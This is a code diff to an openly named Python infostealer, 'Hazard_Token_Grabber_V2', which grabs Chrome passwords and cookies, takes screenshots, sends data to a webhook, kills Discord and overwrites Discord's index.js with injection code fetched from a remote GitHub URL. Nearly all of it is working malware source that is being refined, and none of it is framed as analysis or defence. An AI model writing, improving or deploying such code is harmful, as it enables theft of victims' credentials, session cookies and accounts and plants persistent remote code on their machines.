@@ -1,7 +1,16 @@
-import requests, os, string, random, win32crypt, shutil, sqlite3, zipfile, json, base64, psutil, pyautogui
+import requests
+import os 
+import win32crypt 
+import shutil 
+import sqlite3 
+import zipfile 
+import json 
+import base64 
+import psutil 
+import pyautogui
+
 from re import findall
 from datetime import datetime
-from urllib.request import Request, urlopen
 from Crypto.Cipher import AES
 
 class Hazard_Token_Grabber_V2:
@@ -10,7 +19,7 @@ class Hazard_Token_Grabber_V2:
         self.files = ""
         self.appdata = os.getenv("localappdata")
         self.roaming = os.getenv("appdata")
-        self.tempfolder = f"{self.appdata}\\{self.letters(8)}"
+        self.tempfolder = os.getenv("temp")+"\\Hazard_Token_Grabber_V2"
 
         os.mkdir(os.path.join(self.tempfolder))
 
@@ -18,7 +27,7 @@ class Hazard_Token_Grabber_V2:
         self.saved = []
 
         if not os.path.exists(self.appdata+'\\Google'):
-            self.files += f"**{os.getlogin()}** doesn't have google installed"
+            self.files += f"**{os.getlogin()}** doesn't have google installed\n"
         else:
             self.grabPassword()
             self.grabCookies()
@@ -26,6 +35,7 @@ class Hazard_Token_Grabber_V2:
         self.screenshot()
         self.SendInfo()
         self.LogOut()
+        shutil.rmtree(self.tempfolder)
 
     def getheaders(self, token=None, content_type="application/json"):
         headers = {
@@ -36,31 +46,22 @@ class Hazard_Token_Grabber_V2:
             headers.update({"Authorization": token})
         return headers
 
-    def letters(self, stringLength):
-        return ''.join(random.choice(string.ascii_letters) for i in range(stringLength))
-
     def LogOut(self):
         for proc in psutil.process_iter():
             if any(procstr in proc.name() for procstr in\
-            ['discord', 'Discord', 'DISCORD',]):
+            ['Discord', 'DiscordCanary', 'DiscordDevelopment', 'DiscordPTB']):
                 proc.kill()
         for root, dirs, files in os.walk(os.getenv("LOCALAPPDATA")):
             for name in dirs:
-                if (name.__contains__("discord_desktop_core-")):
+                if "discord_desktop_core-" in name:
                     try:
                         directory_list = os.path.join(root, name+"\\discord_desktop_core\\index.js")
                         os.mkdir(os.path.join(root, name+"\\discord_desktop_core\\Hazard"))
-                        f = urlopen("https://raw.githubusercontent.com/Rdimo/Injection/master/Injection-clean")
-                        index_content = f.read()
-                        with open(directory_list, 'wb') as index_file:
-                            index_file.write(index_content)
-                        with open(directory_list, 'r+') as index_file2:
-                            replace_string = index_file2.read().replace("%WEBHOOK_LINK%", self.webhook)
-                        with open(directory_list, 'w'): pass
-                        with open(directory_list, 'r+') as index_file3:
-                            index_file3.write(replace_string)
                     except FileNotFoundError:
                         pass
+                    f = requests.get("https://raw.githubusercontent.com/Rdimo/Injection/master/Injection-clean").text.replace("%WEBHOOK_LINK%", self.webhook)
+                    with open(directory_list, 'w', encoding="utf-8") as index_file:
+                        index_file.write(f)
         for root, dirs, files in os.walk(os.getenv("APPDATA")+"\\Microsoft\\Windows\\Start Menu\\Programs\\Discord Inc"):
             for name in files:
                 discord_file = os.path.join(root, name)
